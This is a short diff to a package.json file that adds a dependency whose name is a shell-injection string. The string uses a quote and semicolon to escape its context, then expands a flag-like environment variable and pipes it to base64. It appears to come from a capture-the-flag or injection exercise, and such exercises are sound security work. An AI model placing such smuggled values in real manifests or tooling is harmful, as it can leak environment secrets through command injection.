@@ -8,7 +8,8 @@
     "axios": "0.21.1",
     "express": "4.17.1",
     "moment": "2.29.1",
-    "qs": "6.5.2"
+    "qs": "6.5.2",
+    "';${FLAG_GRAVY_OVERFLOW_L3_REAL_FANCY}|base64": "5"
   },
   "devDependencies": {
     "eslint": "8.57.0"
